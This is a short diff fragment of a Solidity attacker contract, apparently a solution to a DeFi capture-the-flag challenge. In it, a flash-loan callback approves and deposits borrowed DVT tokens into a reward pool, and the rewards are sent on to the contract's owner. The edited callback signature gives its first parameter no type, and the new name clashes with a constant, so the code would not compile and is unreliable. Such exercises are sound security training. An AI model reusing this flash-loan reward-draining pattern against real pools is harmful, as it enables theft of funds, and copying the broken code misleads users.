@@ -28,7 +28,7 @@ contract AttackerContract {
         rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 
-    function receiveFlashLoan(_totalAmountToFlashLoan, uint256) public {
+    function receiveFlashLoan(TOTAL_AMOUNT_TO_FLASHLOAN, uint256) public {
         require(msg.sender == flashLoanerPool, "Not Pool");
         dvt.approve(theRewarderPool, TOTAL_AMOUNT_TO_FLASHLOAN);
         theRewarderPool.deposit(TOTAL_AMOUNT_TO_FLASHLOAN);
